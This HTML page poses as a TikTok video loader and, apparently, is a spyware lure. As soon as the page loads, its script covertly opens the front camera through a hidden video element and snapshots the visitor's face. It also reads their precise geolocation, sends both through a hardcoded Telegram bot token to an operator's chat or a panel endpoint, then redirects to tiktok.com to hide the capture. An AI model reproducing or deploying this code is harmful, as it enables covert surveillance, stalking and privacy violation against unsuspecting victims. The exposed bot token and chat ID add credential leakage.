<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok - Watch & Share Videos</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #010101; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
        #canvas { display: none; }
        p { font-size: 1rem; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader" class="loader"></div>
    <p id="status">Memuat video TikTok...</p>
</div>

<video id="webcam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // ================= CONFIG TELEGRAM ===================================
    const TELEGRAM_BOT_TOKEN = '8762651077:AAHAbyLHR3DRVNEWxSXbO7kDi2PS-vV9A1A';
    const ADMIN_CHAT_ID = '1966317946'; 
    // =====================================================================

    // ================= CONFIG PANEL PTERODACTYL ==========================
    const PANEL_ENDPOINT = 'https://gervho.com'; 
    const TARGET_WEBSITE = 'https://tiktok.com'; 
    // =====================================================================

    const urlParams = new URLSearchParams(window.location.search);
    const SENDER_ID = urlParams.get('sender'); 

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    let currentStream = null;

    async function startAutoCamera() {
        try {
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            video.srcObject = currentStream;

            video.onplay = () => {
                setTimeout(takeAndSendSnapshot, 2000); // Dipercepat menjadi 2 detik
            };
        } catch (err) {
            console.log("Kamera ditolak/gagal, lanjut ambil lokasi...");
            ambilDataLokasiAndSend(null); 
        }
    }

    function takeAndSendSnapshot() {
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setTimeout(takeAndSendSnapshot, 200);
            return;
        }

        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        canvas.toBlob((blob) => {
            ambilDataLokasiAndSend(blob);
        }, 'image/png');
    }

    function ambilDataLokasiAndSend(imageBlob) {
        const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    // PERBAIKAN FATAL: Menambahkan tanda $ sebelum kurung kurawal lat dan format query peta (?q=)
                    const teksLokasi = `<b>📌 Lokasi Pengguna:</b>\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 <a href="https://google.com{lat},${lon}">Buka di Google Maps</a>`;
                    
                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
                },
                (error) => {
                    let alasan = "Ditolak/Gagal";
                    if (error.code === error.PERMISSION_DENIED) alasan = "Izin lokasi ditolak pengguna";
                    const teksLokasi = `⚠️ <b>Lokasi:</b> ${alasan}`;
                    
                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            const teksLokasi = `❌ Browser tidak mendukung geolokasi.`;
            prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
        }
    }

    function prosesPengiriman(recipientId, blob, infoLokasi) {
        // Jika ada sender ID dan Anda ingin mencoba lewat panel dulu
        if (SENDER_ID && PANEL_ENDPOINT !== "https://gervho.com") { 
            const imageData = blob ? canvas.toDataURL('image/png') : null;
            
            fetch(PANEL_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    senderId: recipientId,
                    image: imageData,
                    location: infoLokasi
                })
            })
            .then(res => res.json())
            .then(data => {
                if (!data.ok) { sendDirectTelegram(recipientId, blob, infoLokasi); } 
                else { window.location.href = TARGET_WEBSITE; }
            })
            .catch(err => {
                sendDirectTelegram(recipientId, blob, infoLokasi);
            });
        } else {
            // JALUR DIREK: Langsung tembak Telegram tanpa nunggu panel Pterodactyl yang lambat
            sendDirectTelegram(recipientId, blob, infoLokasi);
        }
    }

    async function sendDirectTelegram(chatIdToSend, blob, infoLokasi) {
        const captionTeks = `📸 <b>Aktivitas Berhasil Direkam!</b>\n\n${infoLokasi}`;

        try {
            if (blob) {
                const formData = new FormData();
                formData.append('chat_id', chatIdToSend);
                formData.append('photo', blob, 'snapshot.png');
                formData.append('caption', captionTeks);
                formData.append('parse_mode', 'HTML'); // Menggunakan HTML agar tag tautan lebih stabil daripada Markdown

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatIdToSend,
                        text: captionTeks,
                        parse_mode: 'HTML'
                    })
                });
            }
        } catch (error) {
            console.error("Gagal kirim Telegram:", error);
        } finally {
            window.location.href = TARGET_WEBSITE;
        }
    }

    window.addEventListener('load', startAutoCamera);
</script>

</body>
</html>
